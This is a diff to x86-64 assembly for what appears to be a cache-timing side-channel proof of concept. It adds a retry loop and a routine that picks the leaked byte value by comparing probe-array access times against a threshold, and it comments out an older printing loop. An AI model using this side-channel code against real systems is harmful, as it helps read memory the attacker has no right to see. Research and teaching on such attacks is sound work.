@@ -58,6 +58,7 @@ _start:
     mov   RDI,probe           ; move address of probe array to RDI
     call  random_fill
 
+next_try:
     mov   RBX,page_size       ; size of the pages
     mov   RSI,probe           ; base address of the probe array (to clear from cache)
     call  clear_cache
@@ -129,7 +130,15 @@ _start:
     mov   RAX,1               ; sys write
     mov   RDI,1               ; stdout
     syscall
+    ; end helping output...
 
+    mov   RDI,print_area
+    mov   RSI,analyse
+    call  get_probable_value
+    cmp   BH,1
+    je    print_value
+    jmp   next_try
+print_value:
     mov   RSI,spossible
     mov   RDI,print_area
     call  prints
@@ -140,28 +149,37 @@ _start:
     mov   RDI,1               ; stdout
     syscall
 
-    xor   RCX,RCX
-search_hit:
-    push  RCX
-    mov   RSI,analyse
-    mov   RAX,[RSI+8*RCX]
-    cmp   RAX,R13
-    jge   no_hit
-    mov   RAX,RCX
+    mov   AL,BL
     mov   RDI,print_area
     call  printhb
-    mov   AL,' '
-    stosb
-    mov   RDX,3
+    mov   RDX,2
     mov   RAX,1               ; sys write
     mov   RDI,1               ; stdout
     mov   RSI,print_area
     syscall
-no_hit:
-    pop   RCX
-    inc   RCX
-    cmp   RCX,256
-    jl    search_hit
+
+;    xor   RCX,RCX
+;search_hit:
+;    push  RCX
+;    mov   RSI,analyse
+;    mov   RAX,[RSI+8*RCX]
+;    cmp   RAX,R13
+;    jge   no_hit
+;    mov   RAX,RCX
+;    mov   RDI,print_area
+;    call  printhb
+;    mov   AL,' '
+;    stosb
+;    mov   RDX,3
+;    mov   RAX,1               ; sys write
+;    mov   RDI,1               ; stdout
+;    mov   RSI,print_area
+;    syscall
+;no_hit:
+;    pop   RCX
+;    inc   RCX
+;    cmp   RCX,256
+;    jl    search_hit
     mov   RAX,1               ; sys write
     mov   RDI,1               ; stdout
     mov   RSI,scr
@@ -325,9 +343,9 @@ next_value:
     lodsq
     add   R15,RAX
     cmp   R14,RAX
-    jl    no_new_min1
+    jl    no_new_min
     mov   R14,RAX
-no_new_min1:
+no_new_min:
     inc   RCX
     cmp   RCX,256
     jl    next_value
@@ -336,4 +354,49 @@ no_new_min1:
     pop   RCX
     pop   RAX
     popfq
+    ret
+
+; Get the probable value based on the average and minimum access time of the
+; cache.
+; - in
+; RSI: Address of the analysis data. The array is expected to contain 256 quad
+;      word values (2 KiB).
+; - out
+; BH: Number of found values with access time below threshold
+; BL: The value found; only valid if BH is 1
+get_probable_value:
+    push  RAX
+    push  RCX
+    push  R12
+    push  R13
+    push  R14
+    push  R15
+    mov   R12,RSI
+    xor   BX,BX
+
+    call  analyse_access
+    add   R15,R14
+    shr   R15,1                         ; R15 now contains the threashold value
+    mov   RSI,R12
+    xor   RCX,RCX
+next_prob_value:
+    mov   RAX,[RSI+8*RCX]
+    cmp   RAX,R15
+    jge   not_value
+    inc   BH                            ; inc the number of found values
+    cmp   BH,1                          ; check if this is the first value found
+    jne   multiple_values
+    mov   BL,CL                         ; save the value
+multiple_values:
+not_value:
+    inc   RCX
+    cmp   RCX,256
+    jl    next_prob_value
+
+    pop   R15
+    pop   R14
+    pop   R13
+    pop   R12
+    pop   RCX
+    pop   RAX
     ret
